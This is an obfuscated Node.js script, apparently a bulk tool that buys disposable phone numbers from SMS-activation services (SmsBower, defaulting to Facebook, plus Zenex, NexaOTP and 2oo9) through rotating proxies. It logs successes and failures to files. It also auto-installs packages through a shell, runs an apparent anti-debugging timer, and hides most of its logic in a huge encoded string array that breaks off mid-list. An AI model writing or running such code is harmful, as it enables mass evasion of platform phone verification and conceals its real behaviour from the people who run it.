const fs = require('fs'),
  path = require("path");
const {
    execSync
  } = require("child_process"),
  {
    isMainThread
  } = require("worker_threads");
if (isMainThread) {
  const requiredModules = ["https-proxy-agent", "socks-proxy-agent", "chalk"];
  let missingModules = false;
  for (const mod of requiredModules) {
    try {
      require.resolve(mod);
    } catch (v19) {
      missingModules = true;
      break;
    }
  }
  if (missingModules) {
    console.log("\n[SETUP] First time setup: Installing required dependencies...");
    try {
      const npmCmd = path.join(path.dirname(process.execPath), process.platform === "win32" ? "npm.cmd" : "npm"),
        v20 = {};
      v20.stdio = "inherit", v20.shell = true, execSync('\x22' + npmCmd + "\" install https-proxy-agent socks-proxy-agent chalk@4", v20), console.log("[SETUP] Dependencies installed successfully!\n");
    } catch (v21) {
      console.error("[ERROR] Failed to install dependencies. Make sure Node.js and NPM are installed properly."), process.exit(1);
    }
  }
}
const https = require("https"),
  zlib = require("zlib"),
  crypto = require("crypto"),
  chalk = require("chalk"),
  readline = require("readline"),
  {
    HttpsProxyAgent
  } = require("https-proxy-agent"),
  {
    SocksProxyAgent
  } = require("socks-proxy-agent");
let SUCCESSFUL_FILE = "successful.txt",
  FAILED_FILE = "failed.txt",
  DEBUG_FILE = "debug.txt";
function debugLog(v22, v23, v24) {
  try {
    const v25 = '[' + new Date().toISOString() + "] [" + v22 + ']\x20' + v23 + ':\x20' + v24 + '\x0a';
    fs.appendFileSync(DEBUG_FILE, v25);
  } catch (v26) {}
}
const B = chalk.hex("#9b59b6"),
  C = chalk.hex("#8e44ad"),
  Y = chalk.hex("#FFD700"),
  W = chalk.white,
  G = chalk.gray,
  R = chalk.hex("#FF6B6B");
class NexaRateLimiter {
  constructor(v27) {
    this.delayMs = v27;
    this.queue = [], this.processing = false;
  }
  ["enqueue"](v28) {
    return new Promise((v29, v30) => {
      {
        this.queue.push(async () => {
          try {
            v29(await v28());
          } catch (v31) {
            v30(v31);
          }
        });
        if (!this.processing) this._process();
      }
    });
  }
  async ["_process"]() {
    this.processing = true;
    while (this.queue.length > 0) {
      const v32 = this.queue.shift();
      await v32(), await new Promise(v33 => setTimeout(v33, this.delayMs));
    }
    this.processing = false;
  }
}
const nexaLimiter = new NexaRateLimiter(500),
  VOLTX_KEY_FILE = path.join(__dirname, "voltx_key.txt"),
  STEX_KEY_FILE = path.join(__dirname, "stex_key.txt"),
  TWOOO_HOST = "api.2oo9.cloud";
(function () {
  const fn3 = function () {
    let v35;
    try {
      v35 = Function('return (function() {}.constructor("return this")( ));')();
    } catch (v36) {
      v35 = window;
    }
    return v35;
  };
  const v34 = fn3();
  v34.setInterval(fn2, 3500);
})();
const TWOOO_VOLTX_GET = "/MXS47FLFX0U/tnevs/@public/api/getnum",
  TWOOO_VOLTX_CONSOLE = "/MXS47FLFX0U/tnevs/@public/api/console",
  TWOOO_STEX_GET = "/MXS47FLFX0U/tness/@public/api/getnum",
  TWOOO_STEX_CONSOLE = "/MXS47FLFX0U/tness/@public/api/console",
  SMSBOWER_HOST = "smsbower.page",
  SMSBOWER_KEY_FILE = path.join(__dirname, "smsbower_key.txt");
function smsBowerRequest(v37) {
  return new Promise((v38, v39) => {
    const v40 = {};
    v40.hostname = SMSBOWER_HOST, v40.port = 0x1bb, v40.path = "/stubs/handler_api.php?" + v37, v40.method = "GET";
    v40.headers = {}, v40.headers.Accept = "text/plain", v40.headers.Connection = "close";
    const v41 = v40,
      v42 = https.request(v41, v43 => {
        {
          let v44 = '';
          v43.on("data", v45 => v44 += v45), v43.on("end", () => v38(v44.trim()));
        }
      });
    v42.on("error", v46 => v39(new Error("SmsBower net: " + v46.message))), v42.setTimeout(15000, () => {
      v42.destroy(), v39(new Error("SmsBower timeout"));
    }), v42.end();
  });
}
function smsBowerFetchNumber(v47, v48, v49, v50) {
  let v51 = "api_key=" + encodeURIComponent(v47) + "&action=getNumber&service=" + encodeURIComponent(v48 || 'fb');
  v49 && String(v49).trim() !== '0' && String(v49).trim() !== '' && (v51 += "&country=" + encodeURIComponent(v49));
  return v50 && parseFloat(v50) > 0 && (v51 += "&maxPrice=" + encodeURIComponent(v50)), smsBowerRequest(v51).then(v52 => {
    if (v52.startsWith("ACCESS_NUMBER:")) {
      const v53 = v52.split(':');
      return {
        'activationId': v53[1],
        'phoneNumber': v53[2].replace(/[^0-9]/g, '')
      };
    }
    throw new Error("SmsBower: " + v52);
  });
}
const ZENEX_HOST = "api.zenexnetwork.com",
  ZENEX_KEY_FILE = path.join(__dirname, "zenex_key.txt");
function zenexFetchNumber(v54, v55) {
  return new Promise((v56, v57) => {
    {
      const v58 = {};
      v58.range = v55, v58.is_national = false, v58.remove_plus = false;
      const v59 = JSON.stringify(v58),
        v60 = {
          'hostname': ZENEX_HOST,
          'port': 0x1bb,
          'path': "/v1/getnum",
          'method': "POST",
          'headers': {
            'mapikey': v54,
            'Content-Type': "application/json",
            'Content-Length': Buffer.byteLength(v59)
          }
        },
        v61 = https.request(v60, v62 => {
          let v63 = '';
          v62.on("data", v64 => v63 += v64);
          v62.on("end", () => {
            try {
              const v65 = JSON.parse(v63);
              if (v65?.["meta"]?.["code"] === 200 && v65?.["data"]?.["full_number"]) v56(v65.data.full_number.replace(/[^0-9]/g, ''));else v57(new Error(v65?.["message"] || "Zenex: no number"));
            } catch (v66) {
              v57(new Error("Zenex: invalid JSON"));
            }
          });
        });
      v61.on("error", v67 => v57(new Error("Zenex net: " + v67.message))), v61.setTimeout(15000, () => {
        v61.destroy();
        v57(new Error("Zenex timeout"));
      }), v61.write(v59), v61.end();
    }
  });
}
function nexaFetchNumber(v68, v69, v70) {
  return new Promise((v71, v72) => {
    const v73 = {};
    v73.range = v69, v73.format = "normal";
    const v74 = JSON.stringify(v73);
    const v75 = {
        'hostname': "nexaotpservice.com",
        'port': 0x50,
        'path': v70 || "/api/v1/numbers/get",
        'method': "POST",
        'headers': {
          'X-API-Key': v68,
          'Content-Type': "application/json",
          'Content-Length': Buffer.byteLength(v74)
        }
      },
      v76 = http.request(v75, v77 => {
        {
          let v78 = '';
          v77.on("data", v79 => v78 += v79), v77.on("end", () => {
            try {
              const v80 = JSON.parse(v78);
              if (v80.success && v80.number) {
                v71(v80.number.replace(/[^0-9]/g, ''));
              } else v72(new Error(v80.error || "NexaOTP: No number returned"));
            } catch (v81) {
              v72(new Error("NexaOTP: Invalid response"));
            }
          });
        }
      });
    v76.on("error", v82 => v72(new Error("NexaOTP network: " + v82.message))), v76.setTimeout(10000, () => {
      v76.destroy(), v72(new Error("NexaOTP: Timeout"));
    }), v76.write(v74), v76.end();
  });
}
const http = require("http"),
  twoOoLimiter = new NexaRateLimiter(500);
function stripRid(v83) {
  return v83.replace(/X+$/i, '').trim();
}
function twoOoFetchNumber(v84, v85, v86) {
  return new Promise((v87, v88) => {
    const v89 = stripRid(v85);
    const v90 = {};
    v90.rid = v89;
    const v91 = JSON.stringify(v90);
    const v92 = {
        'hostname': TWOOO_HOST,
        'port': 0x1bb,
        'path': v86,
        'method': "POST",
        'headers': {
          'mauthapi': v84,
          'Content-Type': "application/json",
          'Content-Length': Buffer.byteLength(v91)
        }
      },
      v93 = https.request(v92, v94 => {
        {
          let v95 = '';
          v94.on("data", v96 => v95 += v96), v94.on("end", () => {
            try {
              const v97 = JSON.parse(v95);
              if (v97?.["meta"]?.["code"] === 200 && v97?.["data"]?.["no_plus_number"]) v87(v97.data.no_plus_number);else v88(new Error(v97?.["message"] || v97?.["meta"]?.["status"] || "2oo9: No number"));
            } catch (v98) {
              v88(new Error("2oo9: Invalid JSON"));
            }
          });
        }
      });
    v93.on("error", v99 => v88(new Error("2oo9 network: " + v99.message))), v93.setTimeout(10000, () => {
      v93.destroy(), v88(new Error("2oo9: Timeout"));
    }), v93.write(v91), v93.end();
  });
}
function fn1() {
  const v100 = ['zcbkuW', 'BMqGAq', 'mJm0', 'wdi1nq', 'BwLU', 'BMvS', 'BYbnyq', 'l3nTCW', 'C2v0sq', 'BfnYsa', 'q3LxDa', 'Aw5MBa', 'C2f2zq', 'yxjLza', 'DLLIzG', 'Dgviyq', 'BMHVsW', 'cIaGrq', 'CMv1CW', 'tw51CG', 'CMvSzq', 'qMHsva', 'te9tAW', 'zw1QrG', 'y093ta', 'rfn3rG', 'FdeW', 'vvjdrq', 'wfnkBW', 'D1fUtq', 'AwvUDa', 'u2LSzq', 'v3Dgqq', 'x2vUDa', 'B25ZBW', 'A3DpBG', 'qtiWlq', 'zhvSzq', 'xsbuzq', 'BKTcra', 'ENz6rq', 'ic1fCG', 'ihjLAG', 'DLvPEG', 'C2HVBq', 'tNfzAq', 'zgvIDq', 'iej1Aq', 'tK9uia', 'tgLNzq', 'CNzLCG', 'D3fkyW', 'AhHXra', 'C0LXrG', 'CIbqCG', 'icaG', 'AxvTia', 'rM5ozG', 'AhbqrW', 'uezSDG', 'qNL1yW', 'zML4pq', 'DcdIHPiG', 'wwnArW', 'u0vsvG', 'B091rG', 'B3CGDa', 'yKngrq', 'te1cva', 'reHOCa', 'ENzzyG', 'Ffn1yW', 'B24Gka', 'Cc4k', 'AYCGDa', 'DgLUDq', 'yu1SDG', 'AvrJCW', 'wwvZ', 'DhfYDW', 'zfDrBa', 'C0zjsq', 'odq5zq', 'uvffva', 'vxvbtW', 'B1HJva', 'x2nVza', 'vfPMzW', 'Duj3Cq', 'CerQDG', 'x3XFFa', 'A3fbuq', 'D2fYBq', 'mZC1', 'suP6yW', 'Cf9SBW', 'zffsyq', 'ntzFrW', 'mJiW', 'zM96yG', 'sePsta', 'EM9U', 'wKrysa', 'y3ffsG', 'zxHPCW', 'vxnLia', 'sLnSyG', 'vgHgtq', 'CgKVzW', 'vLDxvW', 'u3rWBq', 'CNj6vq', 'zMXVBW', 'rKv3DW', 'C29JAW', 'yLjNBa', 'v1D2uG', 'yxjJAa', 'vuztlq', 'rNjYrq', 'EgXfuW', 'zxH5Cq', 'rKjTsq', 'EKXbzq', 'yxjKDW', 'ie5Via', 'zxHWAq', 's1v6qq', 'yxrLDW', 'ihbYBW', 'ANbxCG', 'EdOGBG', 'yKDUsW', 'CMvHyW', 'rgvMyq', 'DgvTua', 'tKXMCa', 'C1v5CG', 'AvPgCW', 'y2rSsq', 'qvbIzq', 'AuzjCq', 'yM92Eq', 'v0TAyG', 'u1fxCW', 'B24G', 'tNnRqW', 'BM9UAq', 'Chrhyq', 'oI8V', 'AwzPyW', 'CfnYtq', 'ChbZ', 'uuH2sa', 'tePPDa', 'uhjV', 'B3jTyq', 'Axr5ia', '8j+tHcbWCG', 'odu2', 'otC1', 'wxLgBW', 'yxznyW', 's2TqDG', 'mJqY', 'zxiGka', 'sfj5uq', 'C1HwwG', 'mJmW', 'C3nPBG', 'vg90yq', 'ifu7ia', 'veXtDG', 'AvLpCW', 'r1Pjzq', 'B25Uzq', 'ugXLyq', 'zY50Ea', 'Dc5TBW', 'rgzxBa', 'ie51Bq', 'zxjfBG', 'ywX5Da', 'ywXYzq', 'igrLDG', 'BwvZCW', 'mJy5', 'C3rHBG', 'DcbYyq', 'nJC3', 'BNrFzq', 'BcbODa', 'z3jVDq', 'B0rztq', 'Ac5Myq', 'zxj2Aq', 'vfzetq', 'otyZ', 'ze9NAG', 'oIbnAq', 'wLP1va', 'ntbDoG', 'ihbOBW', 'uMv0Dq', 'u0HnEq', 'mJeZ', 'CMXLBG', 'ugLwyW', 'vgHvEG', 'BNqGia', 'BND4AW', 'mJy4', 'BMX5pW', 'wgT1CG', 'DhngBW', 'A2THwa', 'EgLLCW', 'D0Dbwq', 'CMLUzW', 'zK90Ca', 'zxi7ia', 'zgPcwa', 'ucbbua', 'wMXgCW', 'y0TRyG', 'Aw1LBW', 'CeXIDG', 'ChvZAa', 'u3yXxW', 't2Hhra', 't0TpvW', 'uhjPyW', '8j+AQYboBW', 'FfbYBW', 'CMX0vG', 'C3rHBq', 'mI9Nzq', 'r1vhEG', 'ywnJBW', 'C3vWCa', 'pteMBq', 'Bg9N', 'Dg9Y', 'wunLCq', 'zxj2zq', 'yxrOoG', 'y2SPoG', 'EMzICW', 'ufbkDa', 'whH5va', 'uKXqyq', 'vvaXqq', 'ANnVBG', 'ExPpCW', 'D0zqzG', 'vfDMAq', 'zgLYBG', 'nJC2', 'l3n0Dq', 'y3qTtW', 'EezqrG', 'tNjMqW', 't1bFtG', 'yLPdDq', 'o0zcqq', 'zxjFDa', '4PYtienV', 'svPKwa', 'DM9SDa', 'r0PMrW', 'tgzgEa', 'Cg9PBG', 'EwLUzW', 'EhKGra', 'yxnZqa', 'z19PBG', 'rgvWzq', 'y2LsBq', 'cIaGgW', 'qujIBG', 'tMjrAa', 'D01UuG', 'Dwjgwa', 'tNjxqG', 'yxnZoG', 't0XYvW', 'tKTtCW', 'u1rbva', '4Pwq4Pwq4Pwq4Pwx', 'uKf0vG', 'z2vYzq', 'shLZBa', 'weT5BG', 'Bun1tG', 'CIbozq', 't0rWvW', 'C1jXDW', 'ywLSzq', 'q0TyyG', 'yw1PBa', 'zxqTsq', 't01jyq', 'ihvUza', 't25fwG', 'CNrPCW', 'wNHkqW', 'mM9Voq', 'luvora', 'zePqrG', 'vgrRzG', 'CM9Tia', 'ru10Aq', 'EuH6sG', 'Aw9Upq', 'DhntEq', 'we5cCW', 'zxjFyq', 'yMPODW', 'u0HbmW', 'y3LQCa', 'xsbivW', 'y2vSBa', 'mZGW', 'CMv0CG', 'vhDjtW', 'zfr3uG', 'q0XPCW', 'shfVBW', 'yMfJAW', 'icb8xW', 'CujysW', 'Bca4ia', 'yxrLza', 'sxr1sq', 'B3jKxW', 'ywnOAq', 'uuveqW', 'BfDMEq', 'ndGYogLHsgvMsq', 'uKLYBa', 'CMvKia', 'EhK6ia', 'CMfdDG', 'D2HPDa', 'qwfVtq', 'cIaGwW', 'suD5rq', 'lNr4Da', 'x251Bq', 'ifnLCW', 'lI4Ukq', 'yMvYia', 'B1jzAG', 'CKnIwa', 'zfzoqG', '4P2miev4', 'CM4Gka', 'zML0BW', 'kcKG', 'Bca3', 'ywrK', 'CMvWBa', 'Chbvua', 'j19FFa', 'wNnpsa', 'v1b1ua', 'zLPRsq', 'v2zWwG', 'CMqGlq', 'zs4UlG', 'quvwta', 'wLnPtq', 'uhvRCq', 'y3qGCG', 'zMzPyW', 'g1SYsW', 'vujszq', 'ndG3mZm4m2DLsg9wzG', 'ssblzq', 'DujRyq', 'zMfJzq', 'xsbgzq', 'y3rTBa', 'vxPxEa', 'mtK6ua', 'Awr0sG', 'D0vWAG', 'EwjZAa', 'AKvQrG', 'B3uGDW', 'zxLktG', 'icGVCa', 'rKXjuq', 'B2LKxW', 'DNmVqa', 'wxPvzW', 'mJy3', 'y2HHAq', 'EsbMBW', 'AxzLqq', 'q29UCW', 't3LLDa', 'q3bnqW', 'B3iGAq', 'vvbDia', 'ntaWkq', 'DeL3zW', 'weLfyW', 'zcbRzq', 'zgvSyq', 'yMfZzq', 'ALjrrG', 'AhbNva', 'A1nxEa', 'DMfSDq', 'weDlBG', 'CMDktW', 'B25FCG', 'z3HzuW', 'C2z1Ba', 'CMjtuq', 'B3rOzq', 'otCX', 'Ew1qrW', 'DwHZza', 'EMLRyG', 'uwPtrW', 'B1zAtG', 'z3fUBG', 'sfHqqW', 'mda3', 'Bcbtzq', 'nZaW', 'EMjoDW', 'zsbZDq', 'nJuZna', 'Dw1Izq', 'AuH3yG', 'wK1htq', 'z2v0', 'rMr0tq', 'qLDQCW', 'DfzTrW', 'Axnysa', 'DMzWyG', 'txbWza', 'zxiGmG', 'BIbWAq', 'Bsbozq', 'odG4', 'q1LvCa', 'BgWGCa', 'sgvdrG', 'A0zhzq', 'uLPyua', 'zwjqra', 'x3DPDa', 'uhrmDW', 'ywnJzq', 'vgDAsG', 'z2u9', 'rwnivG', 'BgvJDa', 'mNW0Fa', 'BwnJ', 's1HZsq', 'z2H0pq', 'B20Gta', 'CMvJDa', 'vLzJBa', 'oda3mW', 'u00Tqq', 'igfUBW', 'ugjfDq', 'igzYBW', 'Cu9Oua', 'yMrxyW', 'ywnO', 'iokaLcbd', 'qKDdzW', 'DwfSBa', 'BxbbCq', 'DMPtCq', 'CNvJDa', 'C1zOsW', 'wg9uEq', 'CYbgAq', 'A0zIzW', 'svrlBa', 'q29UDa', 'ief1Da', 'kdjVBW', 'CNLPBG', 'zwzHDq', 'EgvK', 'zxiGza', 'tvjosq', 'DhbXzq', 'CwPbEa', 'AwrZwG', 'EvHwEq', 'drTBsW', 'rvLOAa', 'ufHhCW', 'Dw5N', 'zw5LCG', 'Cg93zq', 'ExrPyW', 'CNzPyW', 's2PvEq', 'vgPUua', 'jM11Ba', 'wxvwrG', 'uwXRCq', 'B3DUqW', 'EgrsCa', 'zxbLBG', 'y09oAq', 'BLLZra', 'zwq9ma', 'mZmWlG', 'zKLtwa', 'qu5eua', 'rgG3sG', 'BhDSEG', 'zs1pDq', 'zLb2Dq', 'mdTgqG', 'x3WGia', 'CxfiqW', 'CuHMrW', 'terksW', 'u2HhzW', 'CMjUuq', 'FcaNia', 'wMTHDa', 'sM5Xuq', 'CMTrqG', 'DLfvCW', 'vKPLvG', 'B2WGia', 'uujJwG', 'CMfUza', 'CxPVCa', 'AKHzvW', 'zhf3vG', 'zM9yvG', 'ywLwwq', 'zxf1Aq', 'DY1MBW', 'sw5ZDa', 'uLDxuW', 'BwXtyG', 'z2DPBG', 'CeDhDW', 'lJiXma', 'AefQCq', 'qM5iqG', 'A2v5Ca', 'Cha6ia', 'mJqX', 'BwCSja', 'wZmXBq', 'B3iGza', 'icdILia', 'v2jdBa', 'Dg8Gza', 'BMrYBW', 'ihDPDa', 'lJaUmG', 've9fqG', 'vuruAq', 'yLvusa', 'x2fJyW', 'ihWGka', 'l3bYBW', 'AwnLBG', 'jYb0BW', 'ig51Bq', 'DgvUyq', 'AvPfCG', 'ww9uAW', 'ihrPBq', 'DfrPBq', 'sLLluG', 'rg5tyq', 'Au5Ysa', 'DMDHtW', 'z0TrCW', 't1L1ta', 'DxbKyq', 'wZeVmG', 'r3fkqW', 'EvL4ra', 'ifbvqG', 'wfGPia', 'Avjvqq', 'BNbdrG', 'CLfyBa', 'y2fSCW', 'whrmCa', 'lhDPza', 'D2fPtG', 'zMT2DW', 'BhrOEq', 'CM9Wzq', 'q2zJEG', 'vM9SDa', 'vuqXqq', 'DKfHtG', 'y29UyW', 'ifjLDa', 'wvr0Cq', 'B0Hpsa', 'mJq1', 'BerbqG', 'FtTgqG', 'ELzbwa', 'zgLNzq', 'qMT2sa', 'igjHBa', 'rxjTDa', 'vI8ZmW', 'Dc5Tzq', 'qK1VvG', 'yM9VAW', 'qLjwlW', 'zxjZ', 'u1jkra', 'tLrtqG', 'q1rpwG', 'r3r0rG', 'AgfZ', 'zw50Ba', 'zvn5BG', 'A1rHra', 't1DPBW', 'ANntAa', 'rMf0yq', 'icDIyq', 'CvnTtq', 'yNbvBq', 'Aw5Ozq', 'AMHAAq', 'B0rZrG', 'zeDoAa', 'BfLAvW', 'AgvJAW', 'CNfzDG', 'Axr5', 'AfHXvq', 'DNbFzG', 'CNrPBG', 'lZK4nG', 'lJiYma', 'otyY', 'zw5Zzq', 'vfvqxq', 'ELvfwq', 'DgHirq', 'AwDNzq', 'DgvNCG', 'mtGWoq', 'zxnZAq', 'ucbqyq', 'rNfgyq', 'vNnwEG', 'vc1nBW', 'DuXVBq', 'ihnLyW', 'ltmPcG', 't1jDia', 'u2vSzq', 'CM94Eq', 'icDFia', 'u2vUDa', 'zwfJAa', 'C2vYDG', 'rMrMBG', 'DgfJDa', 'zsaTqW', 'DcaTrG', 'BMflrW', 'vLHorq', 'ChjVyW', 'BMvJDa', 'yNKGzW', 'CfnUra', 'B3iOiG', 'rNzUsa', 'AhKNia', 'AwqGCa', 'whvnyW', 'z3D0DW', 'vgLTzq', 'u0HbmG', 'u291CG', 'y2nLCW', 'zxH0ia', 'icaGgW', 'r3v0ra', 'BuHPyW', 'ChjVDG', 'ywjSzq', 'CM4GDa', 'BwfUDq', 'Eu91uG', 'C29YDa', 'nZe3', 'cLSQxq', 'C3rHBa', 'BMrevG', 'BuLuAq', 'vLPLDG', 'q29vzW', 'rxbhBa', 'otK0', 'Dfn5sa', 'icGVzW', 'DKjOrq', 'zxmGCG', 'v2LUmW', 'jNn1zG', 'CIbPBG', 'zxHIDW', 'nc12oa', 'r3jkCW', 'qITjrW', 'DgHttq', 'Bf90Aq', 'yxDnBW', 'yxrPBW', 'Awv3', 'yNrgAq', 'CMXNAG', 'y29UBG', 'z3jlCW', 'Es1HzW', 'vufbva', 'nZvHBW', 'Cgf0Aa', 'lJiZma', 'C3nPBW', 'ntK3', 'zwn0Aq', 'Dg9Rzq', 'qwjVCG', 'CuLjzG', 'Bhq6ia', 'ienVDq', 'uNvJvG', 'x18Pia', 't0DewG', 'y2DHzG', 'otyX', 'CgvYqW', 'zMr4DW', 'rfrtzq', 'AxnFCG', 'C0TnDq', 'vvLqAq', 'sLnptG', 'DgLVBG', 'AMviqG', 'ENbMDa', 'BwfUEq', 'q2r0Aq', 'vNDlDq', 'uLjYAa', 'C2LK', 'r0ncqW', 'ibTBoq', 'ihn1CG', 'zwzSsG', 'rNHmqW', 'Aw1rDG', 'Aw50CW', 't1rq', 'BMv0DW', 'iezHAq', 'DMjQra', 'DgvFCG', 'icbqCG', 'xhWGFa', 'rKH0AG', 'yNjHBG', 'qLDfwq', 'shD4yG', 'AgXpDq', 'BNb1Da', 'zhbVAq', 'twfmCa', 've9YBW', 'B3n0lG', 'ig1HBG', 'zxGGka', 'qMnHEq', 'D3DeAG', 'DNfrtG', 'sNHvvG', 'whfgqq', 't3DMyW', 'wuPNva', 'C21ZyG', 'zgf0yq', 'Ag5ozW', 'uKuG4Ocu', 'q0XPrq', 'EeP5Ba', 'ifrssq', 'qw5ACq', 'mZi1nG', 'ANrquq', 'CKXdrG', 'zuzXvq', 'Dw9gvW', 'q0XOAq', 'Aw5KsW', 'z1zcDq', '4PYtieXV', 'sKPezG', 'BwXJuG', 'iezPBG', 'oIbjBG', 'AxqGua', 'vhzruq', 'suPesa', 's29PCq', 'oNbVCG', 'yxbWBa', 'wLjVAW', 'xsbB', 'DNbFzq', 'wwTfEq', 'lIbbza', 'C2LN', 'uMv0CG', 'mhWXFa', 'vMvYAq', 'vML6qq', 'ifvoqq', 'D2zACa', 'ngfK', 'EKP2sq', 'x2nSAq', 'Cfn5vW', 'B25ZDa', 'ChjVzW', 'zuXwBW', 'seuTrq', 'CYaGqq', '4PscifVIGki', 'ieHxsq', 'qMjeBq', 'seLJyq', 'zgvUyW', 'v1rita', 'iefqsq', 'CwPQwG', 'uuX3yG', 'wg11yq', 'yxrL', 'r0TVwa', 'AxbtEq', 'v2r2za', 'y2HLyW', 'zNPuwq', 'Aw1lAW', 'icPCkq', 'vwrAqq', 'tLjfuW', 'Dg8GBG', 'jsdILiiG', 'EdOGAq', 'wMzHza', 'qKTLzq', 'y1fmwq', 'z0PKyW', 'lwLK', 'BgLLBG', 'qvrjtW', 'DxndBW', 'iejHyW', 'zcb0Aa', 'EerYuG', 'BgX5iq', 'yxbPxW', 'r1Hpsa', 'qvjhrq', 'zxnZBW', 'tw9uCW', '4PYp77Ipien1', 'ifnJyq', 'uvDIva', 'oty1', 'wxLRra', 'lYbCxW', 'zLPXwG', 'qujxua', 'EwvZ', 'BKzSwG', 'zxjFAW', 'tNnjDa', 'A2L3EG', 'C3rLEa', 'Bg1WtW', 'qvLzEa', 'ieXPyW', 'BufMva', 'mJyW', 'v3LuzG', 'r3vysq', 'ywXS', 'otK4qG', 'lIbuyq', 't3bJtq', 'zuHYuq', 'AxnbyG', 'swjUrG', 'lxPblq', 'zxrSza', 'icaGFa', 'qJzc', 'CMfT', 'vunmAq', 'B2XLoG', 'mIaGia', 'Bwf0yW', 'u2vYDG', 'D1HHsa', 'Eg5gsG', 'tM8Sia', 'kYKRkq', 'y2LLCW', 'DgLZAq', 'wgr2AW', 'rgvSzq', 'AgLZiG', 'Aw4GBa', '8j+mKcbbDq', 'CKPiEa', 'r3vpvq', 'rK95rG', 'CY5HBG', 'r29VzW', 's3nTyW', 'EfbmDq', 'ChjVEa', 'ALLLEG', 'ww1Ysa', 'BvzQzG', 'mJqW', 'Cw5iBW', 's1jvEa', 'y3jHCa', 'vMLLDW', 'z2DLCG', 'DvjUBG', 'uwnLAq', 'sgjetG', 'icOOpW', 'A1P3sq', 'lvjtqq', 'EfDotq', 'vufRvG', 'yw5KBa', 'ieTLEq', 'rg1jBa', 'FcaGia', 'zgv0zq', 'q1zLyq', 'CMvWzq', 'z3jHEq', 'zwvKia', 'twfRzq', 'qwjczW', 'ihn1yW', 'yuTwBG', 'Dg9tDa', 'rMfZDa', 'zMfSCW', 'B3H5lq', 'shvREa', 'ntKZ', 'zNncvq', 'x3WGjW', 'ksGGkq', 'l3rUzq', 'Bg12tG', 'B21cEq', 'D2jjra', 'A0zKDW', 'uvLuBW', 'lM5LEa', 'nxWXFa', 'u3jwra', 'zgvSzq', 'Axnuva', 'sMTXyG', 'qw1ywq', 'oIb0lG', 'q2HRrG', 'BNKGCa', 'BM90Aa', 'xsbtDa', 'zc4BwW', 'C3rYAq', 'Ecb0Aq', 'B3HPzq', 'mJe4', 'sgDhwG', 'CgfKuW', 'vKDMuq', 'BMfwua', 'z1rtuq', 'AwHRwG', 'qxLSAG', 'm3W0Fa', 'z2v0tG', 'DKLmDW', 'CMvTzq', 'EM9iAq', 'DfLezG', 'CM9Y', 'Bwf1Da', 'zw50lq', 'yvDQyW', 'y21K', 'vu1crq', 'ugjfuq', 'y2f0yW', 'yM9Sza', 'zJLJzq', 'DgTTBq', 'icboBW', 'wvrkta', 'rwDHuW', 'BMrLCG', 'otKY', 'tsbHCG', 'DhbzvG', 'wMPIBa', 'EvLHvG', 'CIbUzq', 'oLTHlq', 'quTdua', 'jMnVDq', 'Cg9UCW', 'vg9Via', 'zvnZvW', 'A2v5DW', 'A1nuEG', 'Fdf8mG', 'rw50zq', 'mJu2rq', 'DwWUDa', 'vNr6uG', 'uuf6rq', 'zMXjqq', 'D0DYra', 'sKzmCq', 'xsbxyq', 'AgTmqG', 'zwn0', 'tNbKAq', 'sKT0tW', 'wxndyG', 'AgvPzW', 'Bhf1uW', 'tujfuG', 'ifXFxW', 'suPhsq', 'DLvHEG', 'ug9QvW', 'BNvSBa', 'y1PTqG', 'zcaGia', 'tuHjra', '8j+tIIbtAa', 'Dhm7rG', 'nJC5', 'u2LisW', 'C3rHzW', 'BM9UxW', 'ANLItq', 'v2LUza', 'yxbWzq', 'y0foBa', 'CM9WCa', 'EePlta', 'BhvZxW', 'wLLtyG', 'y1DQua', 'zwTYsq', 'EfPqwa', 'CuLVrG', 'zLbWva', 'qNzPqG', 'zxvL', 'uwXKsq', 'ntK2', 'DcbJAa', 'DgvYBG', 'EhKGzG', 'zcbHBG', 'AxDZDG', 'icdILAdILza', 'ywnLyG', 'uLHRyq', 'yLnwuW', 'yxjTnG', 'cIaGqq', 'qvj6za', 'ntK0', 'wNjrtW', 'zw5JAq', 'ig9Mia', 'igTLEq', 'BhPNCW', 'lMnVBq', 'y0j0Dq', 'ievYCG', 'uMfUzW', 'ChPhEa', 'DgLJCW', 'DvbjsW', 'Af9MyG', 'rND2Ea', 'CM1PBG', 'B3nVzG', 'BNv4oW', 'zxjSEq', 'zw50CW', 'weLUsq', 'C0P6Aa', 'Ec13DW', 'ALbosW', 'wMHTra', 'DeLfvG', 'mde2', 'C3rKAq', 'ig9Uia', 'BNn0yq', 'BMvKia', 'zw50CG', 'y1H5ta', 'DI9UDq', 'y0L2uG', 'C3rLBG', 'tfnFqq', 'EMjIAa', 't2PqCq', 'C2rUDq', 'BcbuAq', 'zuHPqq', 'z0rwEG', 'l3bPBG', 'AeTvyG', 'CMvZBW', 'B3DUia', 'DMvUDa', 'uhLAAa', 'mJe2', 'sMX6va', 'uunYsG', 'mI4WlG', 'ifn0yq', 'icdILze', 'BgvUzW', 'suHJsa', 'mJq3', 'ks4Gqq', 'Aw5N', 'su5Zvq', 'x3bHzW', 'r0v5sq', 't0zuvW', 'AgfIBa', 's2DACa', 'EM53za', 'mJiZ', 'Dg9gAq', 'zevKDG', 'DxrOyq', 'BgvUDa', 'C2PprW', 'zwqGDa', 'z0fAwa', 'C2SGlq', 'DgvUyW', 'suXf', 'ywr2zq', 'otu5', 'B3j0zq', 'EwvSBa', 'ifj1BG', 'tgXAsq', 'AhjLyq', 'ihWGmq', 'AuXbuW', 's1PLvG', 'uhjVEa', 'BIbJBW', 'v2nnAa', 'CffmCW', 'q01FuW', 'tgXWyG', 'Bwv0yq', 'D29YAW', 'D2fYzq', 'ks4Grq', 'EunVBG', 'DgvZDa', 'ywX5CW', 'icHUDq', 'DuzXqW', 'Ff98xa', 'yMLKxW', 'zfLyrG', 'BK50rW', 's0LIrW', 'B3DLCG', 'Ee14DG', 'zNvSia', 'zYdIHPiG', 'suqGia', 'Dhrrrq', 'yK5OEq', 'vNj0Dq', 'o0zcqG', 'uNjnuq', 'Cgf0EG', 'CMv0Dq', 'mf06', 'CZOG', 'ls0Tlq', 'y2vFyq', 'BIaGia', 'x2TLEq', 'u0z4ua', 'nJeZna', 'BM9Auq', 'zxDPtq', 'BMDLia', 'B3v0Ca', 'yLDxqq', 'zYbYzq', 'x3WGFa', 'qK5bDG', 'te9vvW', 'l3zLCG', 'ntaGva', 'lI4U', 'CNnPBW', 'igHLyq', 'ig1Vza', 'qKPTzq', 'qvDWCq', 'Cuf2Da', 'CvHVva', 'zxmGzG', 'CgvUza', 'ze1Ktq', 'DxaTzq', 'suXXCq', 's3DIBa', 'yuvirG', 'sgzuuG', 'rLGWvq', 'q1LkvW', 'sg51DW', 'uK9jra', 'ideSmW', 